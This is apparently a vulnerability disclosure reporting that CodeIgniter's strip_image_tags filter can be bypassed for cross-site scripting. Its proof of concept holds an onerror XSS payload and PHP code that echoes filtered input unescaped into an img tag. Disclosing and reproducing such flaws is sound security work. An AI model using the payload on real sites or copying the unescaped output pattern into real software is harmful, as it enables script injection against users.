## Description

CodeIgniter is a PHP full-stack web framework that is light, fast, flexible, and secure.

This package is vulnerable to Cross-site scripting and can be exploited by bypassing the strip_image_tags function filter.

## POC

1. Install via composer by following this (link)[https://codeigniter.com/user_guide/installation/installing_composer.html]
2. Update the index method code on `app/Controllers/Home.php`
```
helper('security');

$payload = 'http://www.example.com/x" onerror=alert(1)//';
$imageurl = strip_image_tags($payload);
echo '<img src="'.$imageurl.'">';
```
3. Run the app to verify the vulnerability by following this (link)[https://codeigniter.com/user_guide/installation/running.html#local-development-server]
